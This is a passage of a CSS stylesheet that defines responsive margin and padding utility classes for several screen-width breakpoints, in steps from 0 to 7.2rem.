        .margin-xs-42--left {
            margin-left: 4.2rem
        }

        .margin-xs-42--right {
            margin-right: 4.2rem
        }

        .margin-xs-48 {
            margin-bottom: 4.8rem;
            margin-top: 4.8rem
        }

        .margin-xs-48--top {
            margin-top: 4.8rem
        }

        .margin-xs-48--bottom {
            margin-bottom: 4.8rem
        }

        .margin-xs-48--left {
            margin-left: 4.8rem
        }

        .margin-xs-48--right {
            margin-right: 4.8rem
        }

        .margin-xs-54 {
            margin-bottom: 5.4rem;
            margin-top: 5.4rem
        }

        .margin-xs-54--top {
            margin-top: 5.4rem
        }

        .margin-xs-54--bottom {
            margin-bottom: 5.4rem
        }

        .margin-xs-54--left {
            margin-left: 5.4rem
        }

        .margin-xs-54--right {
            margin-right: 5.4rem
        }

        .margin-xs-60 {
            margin-bottom: 6rem;
            margin-top: 6rem
        }

        .margin-xs-60--top {
            margin-top: 6rem
        }

        .margin-xs-60--bottom {
            margin-bottom: 6rem
        }

        .margin-xs-60--left {
            margin-left: 6rem
        }

        .margin-xs-60--right {
            margin-right: 6rem
        }

        .margin-xs-66 {
            margin-bottom: 6.6rem;
            margin-top: 6.6rem
        }

        .margin-xs-66--top {
            margin-top: 6.6rem
        }

        .margin-xs-66--bottom {
            margin-bottom: 6.6rem
        }

        .margin-xs-66--left {
            margin-left: 6.6rem
        }

        .margin-xs-66--right {
            margin-right: 6.6rem
        }

        .margin-xs-72 {
            margin-bottom: 7.2rem;
            margin-top: 7.2rem
        }

        .margin-xs-72--top {
            margin-top: 7.2rem
        }

        .margin-xs-72--bottom {
            margin-bottom: 7.2rem
        }

        .margin-xs-72--left {
            margin-left: 7.2rem
        }

        .margin-xs-72--right {
            margin-right: 7.2rem
        }

        .padding-xs {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-xs--top {
            padding-top: 3.6rem
        }

        .padding-xs--bottom {
            padding-bottom: 3.6rem
        }

        .padding-xs--left {
            padding-left: 3.6rem
        }

        .padding-xs--right {
            padding-right: 3.6rem
        }

        .padding-xs-0 {
            padding-bottom: 0rem;
            padding-top: 0rem
        }

        .padding-xs-0--top {
            padding-top: 0rem
        }

        .padding-xs-0--bottom {
            padding-bottom: 0rem
        }

        .padding-xs-0--left {
            padding-left: 0rem
        }

        .padding-xs-0--right {
            padding-right: 0rem
        }

        .padding-xs-6 {
            padding-bottom: .6rem;
            padding-top: .6rem
        }

        .padding-xs-6--top {
            padding-top: .6rem
        }

        .padding-xs-6--bottom {
            padding-bottom: .6rem
        }

        .padding-xs-6--left {
            padding-left: .6rem
        }

        .padding-xs-6--right {
            padding-right: .6rem
        }

        .padding-xs-12 {
            padding-bottom: 1.2rem;
            padding-top: 1.2rem
        }

        .padding-xs-12--top {
            padding-top: 1.2rem
        }

        .padding-xs-12--bottom {
            padding-bottom: 1.2rem
        }

        .padding-xs-12--left {
            padding-left: 1.2rem
        }

        .padding-xs-12--right {
            padding-right: 1.2rem
        }

        .padding-xs-18 {
            padding-bottom: 1.8rem;
            padding-top: 1.8rem
        }

        .padding-xs-18--top {
            padding-top: 1.8rem
        }

        .padding-xs-18--bottom {
            padding-bottom: 1.8rem
        }

        .padding-xs-18--left {
            padding-left: 1.8rem
        }

        .padding-xs-18--right {
            padding-right: 1.8rem
        }

        .padding-xs-24 {
            padding-bottom: 2.4rem;
            padding-top: 2.4rem
        }

        .padding-xs-24--top {
            padding-top: 2.4rem
        }

        .padding-xs-24--bottom {
            padding-bottom: 2.4rem
        }

        .padding-xs-24--left {
            padding-left: 2.4rem
        }

        .padding-xs-24--right {
            padding-right: 2.4rem
        }

        .padding-xs-30 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .padding-xs-30--top {
            padding-top: 3rem
        }

        .padding-xs-30--bottom {
            padding-bottom: 3rem
        }

        .padding-xs-30--left {
            padding-left: 3rem
        }

        .padding-xs-30--right {
            padding-right: 3rem
        }

        .padding-xs-36 {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-xs-36--top {
            padding-top: 3.6rem
        }

        .padding-xs-36--bottom {
            padding-bottom: 3.6rem
        }

        .padding-xs-36--left {
            padding-left: 3.6rem
        }

        .padding-xs-36--right {
            padding-right: 3.6rem
        }

        .padding-xs-42 {
            padding-bottom: 4.2rem;
            padding-top: 4.2rem
        }

        .padding-xs-42--top {
            padding-top: 4.2rem
        }

        .padding-xs-42--bottom {
            padding-bottom: 4.2rem
        }

        .padding-xs-42--left {
            padding-left: 4.2rem
        }

        .padding-xs-42--right {
            padding-right: 4.2rem
        }

        .padding-xs-48 {
            padding-bottom: 4.8rem;
            padding-top: 4.8rem
        }

        .padding-xs-48--top {
            padding-top: 4.8rem
        }

        .padding-xs-48--bottom {
            padding-bottom: 4.8rem
        }

        .padding-xs-48--left {
            padding-left: 4.8rem
        }

        .padding-xs-48--right {
            padding-right: 4.8rem
        }

        .padding-xs-54 {
            padding-bottom: 5.4rem;
            padding-top: 5.4rem
        }

        .padding-xs-54--top {
            padding-top: 5.4rem
        }

        .padding-xs-54--bottom {
            padding-bottom: 5.4rem
        }

        .padding-xs-54--left {
            padding-left: 5.4rem
        }

        .padding-xs-54--right {
            padding-right: 5.4rem
        }

        .padding-xs-60 {
            padding-bottom: 6rem;
            padding-top: 6rem
        }

        .padding-xs-60--top {
            padding-top: 6rem
        }

        .padding-xs-60--bottom {
            padding-bottom: 6rem
        }

        .padding-xs-60--left {
            padding-left: 6rem
        }

        .padding-xs-60--right {
            padding-right: 6rem
        }

        .padding-xs-66 {
            padding-bottom: 6.6rem;
            padding-top: 6.6rem
        }

        .padding-xs-66--top {
            padding-top: 6.6rem
        }

        .padding-xs-66--bottom {
            padding-bottom: 6.6rem
        }

        .padding-xs-66--left {
            padding-left: 6.6rem
        }

        .padding-xs-66--right {
            padding-right: 6.6rem
        }

        .padding-xs-72 {
            padding-bottom: 7.2rem;
            padding-top: 7.2rem
        }

        .padding-xs-72--top {
            padding-top: 7.2rem
        }

        .padding-xs-72--bottom {
            padding-bottom: 7.2rem
        }

        .padding-xs-72--left {
            padding-left: 7.2rem
        }

        .padding-xs-72--right {
            padding-right: 7.2rem
        }
    }

    @media (min-width: 768px) {
        .margin {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin--top {
            margin-top: 3.6rem
        }

        .margin--bottom {
            margin-bottom: 3.6rem
        }

        .margin--left {
            margin-left: 3.6rem
        }

        .margin--right {
            margin-right: 3.6rem
        }

        .margin-sm {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-sm--top {
            margin-top: 3.6rem
        }

        .margin-sm--bottom {
            margin-bottom: 3.6rem
        }

        .margin-sm--left {
            margin-left: 3.6rem
        }

        .margin-sm--right {
            margin-right: 3.6rem
        }

        .margin-sm-0 {
            margin-bottom: 0rem;
            margin-top: 0rem
        }

        .margin-sm-0--top {
            margin-top: 0rem
        }

        .margin-sm-0--bottom {
            margin-bottom: 0rem
        }

        .margin-sm-0--left {
            margin-left: 0rem
        }

        .margin-sm-0--right {
            margin-right: 0rem
        }

        .margin-sm-6 {
            margin-bottom: .6rem;
            margin-top: .6rem
        }

        .margin-sm-6--top {
            margin-top: .6rem
        }

        .margin-sm-6--bottom {
            margin-bottom: .6rem
        }

        .margin-sm-6--left {
            margin-left: .6rem
        }

        .margin-sm-6--right {
            margin-right: .6rem
        }

        .margin-sm-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem
        }

        .margin-sm-12--top {
            margin-top: 1.2rem
        }

        .margin-sm-12--bottom {
            margin-bottom: 1.2rem
        }

        .margin-sm-12--left {
            margin-left: 1.2rem
        }

        .margin-sm-12--right {
            margin-right: 1.2rem
        }

        .margin-sm-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem
        }

        .margin-sm-18--top {
            margin-top: 1.8rem
        }

        .margin-sm-18--bottom {
            margin-bottom: 1.8rem
        }

        .margin-sm-18--left {
            margin-left: 1.8rem
        }

        .margin-sm-18--right {
            margin-right: 1.8rem
        }

        .margin-sm-24 {
            margin-bottom: 2.4rem;
            margin-top: 2.4rem
        }

        .margin-sm-24--top {
            margin-top: 2.4rem
        }

        .margin-sm-24--bottom {
            margin-bottom: 2.4rem
        }

        .margin-sm-24--left {
            margin-left: 2.4rem
        }

        .margin-sm-24--right {
            margin-right: 2.4rem
        }

        .margin-sm-30 {
            margin-bottom: 3rem;
            margin-top: 3rem
        }

        .margin-sm-30--top {
            margin-top: 3rem
        }

        .margin-sm-30--bottom {
            margin-bottom: 3rem
        }

        .margin-sm-30--left {
            margin-left: 3rem
        }

        .margin-sm-30--right {
            margin-right: 3rem
        }

        .margin-sm-36 {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-sm-36--top {
            margin-top: 3.6rem
        }

        .margin-sm-36--bottom {
            margin-bottom: 3.6rem
        }

        .margin-sm-36--left {
            margin-left: 3.6rem
        }

        .margin-sm-36--right {
            margin-right: 3.6rem
        }

        .margin-sm-42 {
            margin-bottom: 4.2rem;
            margin-top: 4.2rem
        }

        .margin-sm-42--top {
            margin-top: 4.2rem
        }

        .margin-sm-42--bottom {
            margin-bottom: 4.2rem
        }

        .margin-sm-42--left {
            margin-left: 4.2rem
        }

        .margin-sm-42--right {
            margin-right: 4.2rem
        }

        .margin-sm-48 {
            margin-bottom: 4.8rem;
            margin-top: 4.8rem
        }

        .margin-sm-48--top {
            margin-top: 4.8rem
        }

        .margin-sm-48--bottom {
            margin-bottom: 4.8rem
        }

        .margin-sm-48--left {
            margin-left: 4.8rem
        }

        .margin-sm-48--right {
            margin-right: 4.8rem
        }

        .margin-sm-54 {
            margin-bottom: 5.4rem;
            margin-top: 5.4rem
        }

        .margin-sm-54--top {
            margin-top: 5.4rem
        }

        .margin-sm-54--bottom {
            margin-bottom: 5.4rem
        }

        .margin-sm-54--left {
            margin-left: 5.4rem
        }

        .margin-sm-54--right {
            margin-right: 5.4rem
        }

        .margin-sm-60 {
            margin-bottom: 6rem;
            margin-top: 6rem
        }

        .margin-sm-60--top {
            margin-top: 6rem
        }

        .margin-sm-60--bottom {
            margin-bottom: 6rem
        }

        .margin-sm-60--left {
            margin-left: 6rem
        }

        .margin-sm-60--right {
            margin-right: 6rem
        }

        .margin-sm-66 {
            margin-bottom: 6.6rem;
            margin-top: 6.6rem
        }

        .margin-sm-66--top {
            margin-top: 6.6rem
        }

        .margin-sm-66--bottom {
            margin-bottom: 6.6rem
        }

        .margin-sm-66--left {
            margin-left: 6.6rem
        }

        .margin-sm-66--right {
            margin-right: 6.6rem
        }

        .margin-sm-72 {
            margin-bottom: 7.2rem;
            margin-top: 7.2rem
        }

        .margin-sm-72--top {
            margin-top: 7.2rem
        }

        .margin-sm-72--bottom {
            margin-bottom: 7.2rem
        }

        .margin-sm-72--left {
            margin-left: 7.2rem
        }

        .margin-sm-72--right {
            margin-right: 7.2rem
        }

        .padding-sm {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-sm--top {
            padding-top: 3.6rem
        }

        .padding-sm--bottom {
            padding-bottom: 3.6rem
        }

        .padding-sm--left {
            padding-left: 3.6rem
        }

        .padding-sm--right {
            padding-right: 3.6rem
        }

        .padding-sm-0 {
            padding-bottom: 0rem;
            padding-top: 0rem
        }

        .padding-sm-0--top {
            padding-top: 0rem
        }

        .padding-sm-0--bottom {
            padding-bottom: 0rem
        }

        .padding-sm-0--left {
            padding-left: 0rem
        }

        .padding-sm-0--right {
            padding-right: 0rem
        }

        .padding-sm-6 {
            padding-bottom: .6rem;
            padding-top: .6rem
        }

        .padding-sm-6--top {
            padding-top: .6rem
        }

        .padding-sm-6--bottom {
            padding-bottom: .6rem
        }

        .padding-sm-6--left {
            padding-left: .6rem
        }

        .padding-sm-6--right {
            padding-right: .6rem
        }

        .padding-sm-12 {
            padding-bottom: 1.2rem;
            padding-top: 1.2rem
        }

        .padding-sm-12--top {
            padding-top: 1.2rem
        }

        .padding-sm-12--bottom {
            padding-bottom: 1.2rem
        }

        .padding-sm-12--left {
            padding-left: 1.2rem
        }

        .padding-sm-12--right {
            padding-right: 1.2rem
        }

        .padding-sm-18 {
            padding-bottom: 1.8rem;
            padding-top: 1.8rem
        }

        .padding-sm-18--top {
            padding-top: 1.8rem
        }

        .padding-sm-18--bottom {
            padding-bottom: 1.8rem
        }

        .padding-sm-18--left {
            padding-left: 1.8rem
        }

        .padding-sm-18--right {
            padding-right: 1.8rem
        }

        .padding-sm-24 {
            padding-bottom: 2.4rem;
            padding-top: 2.4rem
        }

        .padding-sm-24--top {
            padding-top: 2.4rem
        }

        .padding-sm-24--bottom {
            padding-bottom: 2.4rem
        }

        .padding-sm-24--left {
            padding-left: 2.4rem
        }

        .padding-sm-24--right {
            padding-right: 2.4rem
        }

        .padding-sm-30 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .padding-sm-30--top {
            padding-top: 3rem
        }

        .padding-sm-30--bottom {
            padding-bottom: 3rem
        }

        .padding-sm-30--left {
            padding-left: 3rem
        }

        .padding-sm-30--right {
            padding-right: 3rem
        }

        .padding-sm-36 {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-sm-36--top {
            padding-top: 3.6rem
        }

        .padding-sm-36--bottom {
            padding-bottom: 3.6rem
        }

        .padding-sm-36--left {
            padding-left: 3.6rem
        }

        .padding-sm-36--right {
            padding-right: 3.6rem
        }

        .padding-sm-42 {
            padding-bottom: 4.2rem;
            padding-top: 4.2rem
        }

        .padding-sm-42--top {
            padding-top: 4.2rem
        }

        .padding-sm-42--bottom {
            padding-bottom: 4.2rem
        }

        .padding-sm-42--left {
            padding-left: 4.2rem
        }

        .padding-sm-42--right {
            padding-right: 4.2rem
        }

        .padding-sm-48 {
            padding-bottom: 4.8rem;
            padding-top: 4.8rem
        }

        .padding-sm-48--top {
            padding-top: 4.8rem
        }

        .padding-sm-48--bottom {
            padding-bottom: 4.8rem
        }

        .padding-sm-48--left {
            padding-left: 4.8rem
        }

        .padding-sm-48--right {
            padding-right: 4.8rem
        }

        .padding-sm-54 {
            padding-bottom: 5.4rem;
            padding-top: 5.4rem
        }

        .padding-sm-54--top {
            padding-top: 5.4rem
        }

        .padding-sm-54--bottom {
            padding-bottom: 5.4rem
        }

        .padding-sm-54--left {
            padding-left: 5.4rem
        }

        .padding-sm-54--right {
            padding-right: 5.4rem
        }

        .padding-sm-60 {
            padding-bottom: 6rem;
            padding-top: 6rem
        }

        .padding-sm-60--top {
            padding-top: 6rem
        }

        .padding-sm-60--bottom {
            padding-bottom: 6rem
        }

        .padding-sm-60--left {
            padding-left: 6rem
        }

        .padding-sm-60--right {
            padding-right: 6rem
        }

        .padding-sm-66 {
            padding-bottom: 6.6rem;
            padding-top: 6.6rem
        }

        .padding-sm-66--top {
            padding-top: 6.6rem
        }

        .padding-sm-66--bottom {
            padding-bottom: 6.6rem
        }

        .padding-sm-66--left {
            padding-left: 6.6rem
        }

        .padding-sm-66--right {
            padding-right: 6.6rem
        }

        .padding-sm-72 {
            padding-bottom: 7.2rem;
            padding-top: 7.2rem
        }

        .padding-sm-72--top {
            padding-top: 7.2rem
        }

        .padding-sm-72--bottom {
            padding-bottom: 7.2rem
        }

        .padding-sm-72--left {
            padding-left: 7.2rem
        }

        .padding-sm-72--right {
            padding-right: 7.2rem
        }
    }

    @media (min-width: 922px) {
        .margin {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin--top {
            margin-top: 3.6rem
        }

        .margin--bottom {
            margin-bottom: 3.6rem
        }

        .margin--left {
            margin-left: 3.6rem
        }

        .margin--right {
            margin-right: 3.6rem
        }

        .margin-md {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-md--top {
            margin-top: 3.6rem
        }

        .margin-md--bottom {
            margin-bottom: 3.6rem
        }

        .margin-md--left {
            margin-left: 3.6rem
        }

        .margin-md--right {
            margin-right: 3.6rem
        }

        .margin-md-0 {
            margin-bottom: 0rem;
            margin-top: 0rem
        }

        .margin-md-0--top {
            margin-top: 0rem
        }

        .margin-md-0--bottom {
            margin-bottom: 0rem
        }

        .margin-md-0--left {
            margin-left: 0rem
        }

        .margin-md-0--right {
            margin-right: 0rem
        }

        .margin-md-6 {
            margin-bottom: .6rem;
            margin-top: .6rem
        }

        .margin-md-6--top {
            margin-top: .6rem
        }

        .margin-md-6--bottom {
            margin-bottom: .6rem
        }

        .margin-md-6--left {
            margin-left: .6rem
        }

        .margin-md-6--right {
            margin-right: .6rem
        }

        .margin-md-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem
        }

        .margin-md-12--top {
            margin-top: 1.2rem
        }

        .margin-md-12--bottom {
            margin-bottom: 1.2rem
        }

        .margin-md-12--left {
            margin-left: 1.2rem
        }

        .margin-md-12--right {
            margin-right: 1.2rem
        }

        .margin-md-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem
        }

        .margin-md-18--top {
            margin-top: 1.8rem
        }

        .margin-md-18--bottom {
            margin-bottom: 1.8rem
        }

        .margin-md-18--left {
            margin-left: 1.8rem
        }

        .margin-md-18--right {
            margin-right: 1.8rem
        }

        .margin-md-24 {
            margin-bottom: 2.4rem;
            margin-top: 2.4rem
        }

        .margin-md-24--top {
            margin-top: 2.4rem
        }

        .margin-md-24--bottom {
            margin-bottom: 2.4rem
        }

        .margin-md-24--left {
            margin-left: 2.4rem
        }

        .margin-md-24--right {
            margin-right: 2.4rem
        }

        .margin-md-30 {
            margin-bottom: 3rem;
            margin-top: 3rem
        }

        .margin-md-30--top {
            margin-top: 3rem
        }

        .margin-md-30--bottom {
            margin-bottom: 3rem
        }

        .margin-md-30--left {
            margin-left: 3rem
        }

        .margin-md-30--right {
            margin-right: 3rem
        }

        .margin-md-36 {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-md-36--top {
            margin-top: 3.6rem
        }

        .margin-md-36--bottom {
            margin-bottom: 3.6rem
        }

        .margin-md-36--left {
            margin-left: 3.6rem
        }

        .margin-md-36--right {
            margin-right: 3.6rem
        }

        .margin-md-42 {
            margin-bottom: 4.2rem;
            margin-top: 4.2rem
        }

        .margin-md-42--top {
            margin-top: 4.2rem
        }

        .margin-md-42--bottom {
            margin-bottom: 4.2rem
        }

        .margin-md-42--left {
            margin-left: 4.2rem
        }

        .margin-md-42--right {
            margin-right: 4.2rem
        }

        .margin-md-48 {
            margin-bottom: 4.8rem;
            margin-top: 4.8rem
        }

        .margin-md-48--top {
            margin-top: 4.8rem
        }

        .margin-md-48--bottom {
            margin-bottom: 4.8rem
        }

        .margin-md-48--left {
            margin-left: 4.8rem
        }

        .margin-md-48--right {
            margin-right: 4.8rem
        }

        .margin-md-54 {
            margin-bottom: 5.4rem;
            margin-top: 5.4rem
        }

        .margin-md-54--top {
            margin-top: 5.4rem
        }

        .margin-md-54--bottom {
            margin-bottom: 5.4rem
        }

        .margin-md-54--left {
            margin-left: 5.4rem
        }

        .margin-md-54--right {
            margin-right: 5.4rem
        }

        .margin-md-60 {
            margin-bottom: 6rem;
            margin-top: 6rem
        }

        .margin-md-60--top {
            margin-top: 6rem
        }

        .margin-md-60--bottom {
            margin-bottom: 6rem
        }

        .margin-md-60--left {
            margin-left: 6rem
        }

        .margin-md-60--right {
            margin-right: 6rem
        }

        .margin-md-66 {
            margin-bottom: 6.6rem;
            margin-top: 6.6rem
        }

        .margin-md-66--top {
            margin-top: 6.6rem
        }

        .margin-md-66--bottom {
            margin-bottom: 6.6rem
        }

        .margin-md-66--left {
            margin-left: 6.6rem
        }

        .margin-md-66--right {
            margin-right: 6.6rem
        }

        .margin-md-72 {
            margin-bottom: 7.2rem;
            margin-top: 7.2rem
        }

        .margin-md-72--top {
            margin-top: 7.2rem
        }

        .margin-md-72--bottom {
            margin-bottom: 7.2rem
        }

        .margin-md-72--left {
            margin-left: 7.2rem
        }

        .margin-md-72--right {
            margin-right: 7.2rem
        }

        .padding-md {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-md--top {
            padding-top: 3.6rem
        }

        .padding-md--bottom {
            padding-bottom: 3.6rem
        }

        .padding-md--left {
            padding-left: 3.6rem
        }

        .padding-md--right {
            padding-right: 3.6rem
        }

        .padding-md-0 {
            padding-bottom: 0rem;
            padding-top: 0rem
        }

        .padding-md-0--top {
            padding-top: 0rem
        }

        .padding-md-0--bottom {
            padding-bottom: 0rem
        }

        .padding-md-0--left {
            padding-left: 0rem
        }

        .padding-md-0--right {
            padding-right: 0rem
        }

        .padding-md-6 {
            padding-bottom: .6rem;
            padding-top: .6rem
        }

        .padding-md-6--top {
            padding-top: .6rem
        }

        .padding-md-6--bottom {
            padding-bottom: .6rem
        }

        .padding-md-6--left {
            padding-left: .6rem
        }

        .padding-md-6--right {
            padding-right: .6rem
        }

        .padding-md-12 {
            padding-bottom: 1.2rem;
            padding-top: 1.2rem
        }

        .padding-md-12--top {
            padding-top: 1.2rem
        }

        .padding-md-12--bottom {
            padding-bottom: 1.2rem
        }

        .padding-md-12--left {
            padding-left: 1.2rem
        }

        .padding-md-12--right {
            padding-right: 1.2rem
        }

        .padding-md-18 {
            padding-bottom: 1.8rem;
            padding-top: 1.8rem
        }

        .padding-md-18--top {
            padding-top: 1.8rem
        }

        .padding-md-18--bottom {
            padding-bottom: 1.8rem
        }

        .padding-md-18--left {
            padding-left: 1.8rem
        }

        .padding-md-18--right {
            padding-right: 1.8rem
        }

        .padding-md-24 {
            padding-bottom: 2.4rem;
            padding-top: 2.4rem
        }

        .padding-md-24--top {
            padding-top: 2.4rem
        }

        .padding-md-24--bottom {
            padding-bottom: 2.4rem
        }

        .padding-md-24--left {
            padding-left: 2.4rem
        }

        .padding-md-24--right {
            padding-right: 2.4rem
        }

        .padding-md-30 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .padding-md-30--top {
            padding-top: 3rem
        }

        .padding-md-30--bottom {
            padding-bottom: 3rem
        }

        .padding-md-30--left {
            padding-left: 3rem
        }

        .padding-md-30--right {
            padding-right: 3rem
        }

        .padding-md-36 {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-md-36--top {
            padding-top: 3.6rem
        }

        .padding-md-36--bottom {
            padding-bottom: 3.6rem
        }

        .padding-md-36--left {
            padding-left: 3.6rem
        }

        .padding-md-36--right {
            padding-right: 3.6rem
        }

        .padding-md-42 {
            padding-bottom: 4.2rem;
            padding-top: 4.2rem
        }

        .padding-md-42--top {
            padding-top: 4.2rem
        }

        .padding-md-42--bottom {
            padding-bottom: 4.2rem
        }

        .padding-md-42--left {
            padding-left: 4.2rem
        }

        .padding-md-42--right {
            padding-right: 4.2rem
        }

        .padding-md-48 {
            padding-bottom: 4.8rem;
            padding-top: 4.8rem
        }

        .padding-md-48--top {
            padding-top: 4.8rem
        }

        .padding-md-48--bottom {
            padding-bottom: 4.8rem
        }

        .padding-md-48--left {
            padding-left: 4.8rem
        }

        .padding-md-48--right {
            padding-right: 4.8rem
        }

        .padding-md-54 {
            padding-bottom: 5.4rem;
            padding-top: 5.4rem
        }

        .padding-md-54--top {
            padding-top: 5.4rem
        }

        .padding-md-54--bottom {
            padding-bottom: 5.4rem
        }

        .padding-md-54--left {
            padding-left: 5.4rem
        }

        .padding-md-54--right {
            padding-right: 5.4rem
        }

        .padding-md-60 {
            padding-bottom: 6rem;
            padding-top: 6rem
        }

        .padding-md-60--top {
            padding-top: 6rem
        }

        .padding-md-60--bottom {
            padding-bottom: 6rem
        }

        .padding-md-60--left {
            padding-left: 6rem
        }

        .padding-md-60--right {
            padding-right: 6rem
        }

        .padding-md-66 {
            padding-bottom: 6.6rem;
            padding-top: 6.6rem
        }

        .padding-md-66--top {
            padding-top: 6.6rem
        }

        .padding-md-66--bottom {
            padding-bottom: 6.6rem
        }

        .padding-md-66--left {
            padding-left: 6.6rem
        }

        .padding-md-66--right {
            padding-right: 6.6rem
        }

        .padding-md-72 {
            padding-bottom: 7.2rem;
            padding-top: 7.2rem
        }

        .padding-md-72--top {
            padding-top: 7.2rem
        }

        .padding-md-72--bottom {
            padding-bottom: 7.2rem
        }

        .padding-md-72--left {
            padding-left: 7.2rem
        }

        .padding-md-72--right {
            padding-right: 7.2rem
        }
    }

    @media (min-width: 1200px) {
        .margin {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin--top {
            margin-top: 3.6rem
        }

        .margin--bottom {
            margin-bottom: 3.6rem
        }

        .margin--left {
            margin-left: 3.6rem
        }

        .margin--right {
            margin-right: 3.6rem
        }

        .margin-lg {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-lg--top {
            margin-top: 3.6rem
        }

        .margin-lg--bottom {
            margin-bottom: 3.6rem
        }

        .margin-lg--left {
            margin-left: 3.6rem
        }

        .margin-lg--right {
            margin-right: 3.6rem
        }

        .margin-lg-0 {
            margin-bottom: 0rem;
            margin-top: 0rem
        }

        .margin-lg-0--top {
            margin-top: 0rem
        }

        .margin-lg-0--bottom {
            margin-bottom: 0rem
        }

        .margin-lg-0--left {
            margin-left: 0rem
        }

        .margin-lg-0--right {
            margin-right: 0rem
        }

        .margin-lg-6 {
            margin-bottom: .6rem;
            margin-top: .6rem
        }

        .margin-lg-6--top {
            margin-top: .6rem
        }

        .margin-lg-6--bottom {
            margin-bottom: .6rem
        }

        .margin-lg-6--left {
            margin-left: .6rem
        }

        .margin-lg-6--right {
            margin-right: .6rem
        }

        .margin-lg-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem
        }

        .margin-lg-12--top {
            margin-top: 1.2rem
        }

        .margin-lg-12--bottom {
            margin-bottom: 1.2rem
        }

        .margin-lg-12--left {
            margin-left: 1.2rem
        }

        .margin-lg-12--right {
            margin-right: 1.2rem
        }

        .margin-lg-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem
        }

        .margin-lg-18--top {
            margin-top: 1.8rem
        }

        .margin-lg-18--bottom {
            margin-bottom: 1.8rem
        }

        .margin-lg-18--left {
            margin-left: 1.8rem
        }

        .margin-lg-18--right {
            margin-right: 1.8rem
        }

        .margin-lg-24 {
            margin-bottom: 2.4rem;
            margin-top: 2.4rem
        }

        .margin-lg-24--top {
            margin-top: 2.4rem
        }

        .margin-lg-24--bottom {
            margin-bottom: 2.4rem
        }

        .margin-lg-24--left {
            margin-left: 2.4rem
        }

        .margin-lg-24--right {
            margin-right: 2.4rem
        }

        .margin-lg-30 {
            margin-bottom: 3rem;
            margin-top: 3rem
        }

        .margin-lg-30--top {
            margin-top: 3rem
        }

        .margin-lg-30--bottom {
            margin-bottom: 3rem
        }

        .margin-lg-30--left {
            margin-left: 3rem
        }

        .margin-lg-30--right {
            margin-right: 3rem
        }

        .margin-lg-36 {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-lg-36--top {
            margin-top: 3.6rem
        }

        .margin-lg-36--bottom {
            margin-bottom: 3.6rem
        }

        .margin-lg-36--left {
            margin-left: 3.6rem
        }

        .margin-lg-36--right {
            margin-right: 3.6rem
        }

        .margin-lg-42 {
            margin-bottom: 4.2rem;
            margin-top: 4.2rem
        }

        .margin-lg-42--top {
            margin-top: 4.2rem
        }

        .margin-lg-42--bottom {
            margin-bottom: 4.2rem
        }

        .margin-lg-42--left {
            margin-left: 4.2rem
        }

        .margin-lg-42--right {
            margin-right: 4.2rem
        }

        .margin-lg-48 {
            margin-bottom: 4.8rem;
            margin-top: 4.8rem
        }

        .margin-lg-48--top {
            margin-top: 4.8rem
        }

        .margin-lg-48--bottom {
            margin-bottom: 4.8rem
        }

        .margin-lg-48--left {
            margin-left: 4.8rem
        }

        .margin-lg-48--right {
            margin-right: 4.8rem
        }

        .margin-lg-54 {
            margin-bottom: 5.4rem;
            margin-top: 5.4rem
        }

        .margin-lg-54--top {
            margin-top: 5.4rem
        }

        .margin-lg-54--bottom {
            margin-bottom: 5.4rem
        }

        .margin-lg-54--left {
            margin-left: 5.4rem
        }

        .margin-lg-54--right {
            margin-right: 5.4rem
        }

        .margin-lg-60 {
            margin-bottom: 6rem;
            margin-top: 6rem
        }

        .margin-lg-60--top {
            margin-top: 6rem
        }

        .margin-lg-60--bottom {
            margin-bottom: 6rem
        }

        .margin-lg-60--left {
            margin-left: 6rem
        }

        .margin-lg-60--right {
            margin-right: 6rem
        }

        .margin-lg-66 {
            margin-bottom: 6.6rem;
            margin-top: 6.6rem
        }

        .margin-lg-66--top {
            margin-top: 6.6rem
        }

        .margin-lg-66--bottom {
            margin-bottom: 6.6rem
        }

        .margin-lg-66--left {
            margin-left: 6.6rem
        }

        .margin-lg-66--right {
            margin-right: 6.6rem
        }

        .margin-lg-72 {
            margin-bottom: 7.2rem;
            margin-top: 7.2rem
        }

        .margin-lg-72--top {
            margin-top: 7.2rem
        }

        .margin-lg-72--bottom {
            margin-bottom: 7.2rem
        }

        .margin-lg-72--left {
            margin-left: 7.2rem
        }

        .margin-lg-72--right {
            margin-right: 7.2rem
        }

        .padding-lg {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-lg--top {
            padding-top: 3.6rem
        }

        .padding-lg--bottom {
            padding-bottom: 3.6rem
        }

        .padding-lg--left {
            padding-left: 3.6rem
        }

        .padding-lg--right {
            padding-right: 3.6rem
        }

        .padding-lg-0 {
            padding-bottom: 0rem;
            padding-top: 0rem
        }

        .padding-lg-0--top {
            padding-top: 0rem
        }

        .padding-lg-0--bottom {
            padding-bottom: 0rem
        }

        .padding-lg-0--left {
            padding-left: 0rem
        }

        .padding-lg-0--right {
            padding-right: 0rem
        }

        .padding-lg-6 {
            padding-bottom: .6rem;
            padding-top: .6rem
        }

        .padding-lg-6--top {
            padding-top: .6rem
        }

